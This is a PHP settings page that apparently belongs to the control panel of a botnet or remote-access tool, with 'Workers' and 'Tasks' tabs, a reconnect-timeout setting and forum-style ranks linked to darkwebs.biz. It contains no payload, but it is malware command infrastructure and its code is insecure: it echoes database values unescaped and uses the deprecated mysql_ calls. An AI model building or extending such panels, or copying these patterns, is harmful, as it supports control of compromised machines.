<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>sos0ry</title>

    <!-- Bootstrap -->

    <link href="css/style_settings.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="js/bootstrap.js"></script>
  </head>
    <body>
        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']."\">";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
                <?php
                    include('config.php');
                    $cf = mysql_fetch_assoc(mysql_query("SELECT `color` FROM `userinfo`"));
                    $nick = mysql_fetch_assoc(mysql_query("SELECT `login` FROM `userinfo`"));
                    
                    if($cf['color'] == 'Seller')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #06A0F9;text-shadow: #06A0F9 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Resident')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#8A2BE2;text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Administrator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: red;text-shadow: red 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Fusked')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #f6f506;text-shadow: #f6f506 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Moderator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #54E610;text-shadow: #54E610 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Premium')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#fbbc00;text-shadow: #fbbc00 1px 1px 10px;font-weight: bold;background: url(http://darkwebs.biz/styles/stuff/images/bggold.gif);\">".$nick['login']."</a>";
                ?>
                
                </div>
                <ul class="nav navbar-nav">
                <li><a href="table.php">Workers</a></li>
                <li><a href="tasks.php">Tasks</a></li>
                <li class="active"><a href="settings.php">Settings</a></li>
                </ul>
            </div>
        </nav>
        <div style="width:25%; margin: 0 auto;">
            <div class="well" style="opacity: 0.9; margin-left: 5%; text-align:center;">
            <h4 style="color: red;">Change username and password</h4>
                <form action="cmd.php" method="POST">
                    <div class="form-group">
                        <input type="text" class="form-control" name="login" id="usr" placeholder="Username">
                    </div>
                    <div class="form-group">
                        <input type="password" class="form-control" name="password" id="pwd" placeholder="Password">
                    </div>    
                    <input type="hidden" name="change" value="1">
                    <input type="submit" class="btn btn-primary" value="Change">
                </form>
            <h4 style="color: red;">Enable/Disable sound</h4>
                <form action="cmd.php" method="POST">
                    <input type="hidden" name="sound" value="1">
                    <select class="form-control" name="on">
                        <option>on</option>
                        <option>off</option>
                    </select>
                    <input type="submit" class="btn btn-primary" value="Apply">
                </form>
            </div>
            <div class="well" style="opacity: 0.9; margin-left: 5%; text-align:center;">
                <h4 style="color: red;">Change navbar color</h4>
                <form action="cmd.php" method="POST">
                    <div class="form-group">
                        <select class="form-control" name="navbar">
                            <option>Black</option>
                            <option>Light</option>
                        </select>
                    </div>
                    <input type="submit" class="btn btn-primary" value="Change">
                </form>
                <h4 style="color: red;">Change nickname color</h4>
                <form action="cmd.php" method="POST">
                    <div class="form-group">
                        <select class="form-control" name="color">
                            <option style="color:#06A0F9;text-shadow: #06A0F9 1px 1px 10px;font-weight: bold;">Seller</option>
                            <option style="color:#8A2BE2;text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;">Resident</option>
                            <option style="color:red;text-shadow: red 1px 1px 10px;font-weight: bold;">Administrator</option>
                            <option style="color:#f6f506;text-shadow: #f6f506 1px 1px 10px;font-weight: bold;">Fusked</option>
                            <option style="color:#54E610;text-shadow: #54E610 1px 1px 10px;font-weight: bold;">Moderator</option>
                            <option style="color:#fbbc00;text-shadow: #fbbc00 1px 1px 10px;font-weight: bold;background: url(http://darkwebs.biz/styles/stuff/images/bggold.gif);">Premium</option>
                        </select>
                    </div>
                    <input type="submit" class="btn btn-primary" value="Change">
                </form>
            </div>
            <div class="well" style="opacity: 0.9; margin-left: 5%; text-align:center;">
                <h4 style="color: red;">Change reconnect timeout (minutes)</h4>
                <form action="cmd.php" method="POST">
                    <div class="form-group">
                        <input type="number" name="reconnect" class="form-control">
                    </div>
                    <input type="submit" class="btn btn-primary" value="Change">
                </form>
            </div>
        </div>

         <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']." navbar-fixed-bottom\" style='opacity: 0.7'>";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand">sos0ry</a>
                </div>
                
            </div>
    </body>
</html>